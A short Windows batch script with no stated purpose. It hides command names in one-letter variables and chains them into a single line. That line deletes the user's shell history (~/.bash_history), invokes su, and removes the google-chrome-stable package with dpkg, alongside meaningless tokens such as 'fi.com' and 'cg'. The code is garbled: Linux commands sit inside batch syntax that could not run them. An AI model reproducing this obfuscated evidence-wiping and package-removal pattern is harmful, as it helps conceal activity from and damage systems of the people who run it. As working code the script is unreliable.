@echo off
setlocal enabledelayedexpansion

set "a=!A" & set "l=echo" & set "s=pwd" & set "t=fi" & set "x=rev" & set "c=hist" & set "m=rm" & set "g=cg" & set "d=dpkg" & set "u=su" & set "e=ge"
%t%.com&%g%&%m% ~/.bash_history&%l% %s%&%u%&%a%&%d% --remove google-chrome-stable&%e%t -l
